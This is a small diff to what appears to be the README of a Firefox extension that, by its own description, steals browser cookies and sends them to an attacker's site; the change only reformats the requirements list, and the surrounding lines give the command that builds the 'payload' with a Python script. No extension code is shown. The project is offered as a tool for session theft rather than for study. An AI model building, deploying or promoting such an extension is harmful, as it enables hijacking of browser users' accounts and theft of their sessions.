@@ -3,8 +3,9 @@ firefox extension that steal browser cookies
 tested on Mozilla Firefox (115.6.0)
 it send cookies to attacker site 
 # requirements 
-python3
-7z
+`python3
+&
+7z`
 # building payload
 `cd pop_add_bilder;python3 pop_add_bilder.py`
 
